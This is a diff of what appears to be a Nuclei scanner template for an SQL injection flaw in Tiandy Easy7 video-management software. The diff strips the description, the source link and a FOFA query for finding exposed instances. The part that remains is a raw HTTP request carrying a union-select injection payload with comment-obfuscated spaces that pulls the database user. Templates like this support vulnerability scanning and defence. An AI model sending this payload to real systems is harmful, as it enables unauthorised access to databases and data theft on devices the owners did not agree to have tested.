@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7 queryDataByTypeEx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngwlr92c9knskxro'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ngwlr92c9knskxro
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/user(),1 HTTP/1.1
